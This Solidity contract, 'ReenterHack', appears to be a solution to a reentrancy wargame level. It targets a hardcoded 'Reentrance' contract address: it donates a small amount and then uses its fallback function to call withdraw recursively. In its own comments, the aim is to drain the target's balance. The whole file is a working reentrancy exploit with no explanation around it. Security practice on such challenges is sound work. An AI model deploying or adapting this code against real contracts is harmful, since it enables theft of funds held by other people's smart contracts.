pragma solidity ^0.6.0;

interface Reentrance{
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract ReenterHack{
    Reentrance public ogContract = Reentrance(0xCeDA0FB891faA39ac2D409449C59798936DD45e9);
    uint public amount = 1 finney;

    constructor() public payable {
    }

    function donateToOg() public{
        ogContract.donate.value(amount).gas(4000000)(address(this));
    }

    fallback() external payable {
        //use when original contract holds it's own balance (after has been donated to)
        
        //fallback recieve function recursively drains ogContrac
        if(address(ogContract).balance != 0){
            ogContract.withdraw(amount);
        }
    }
}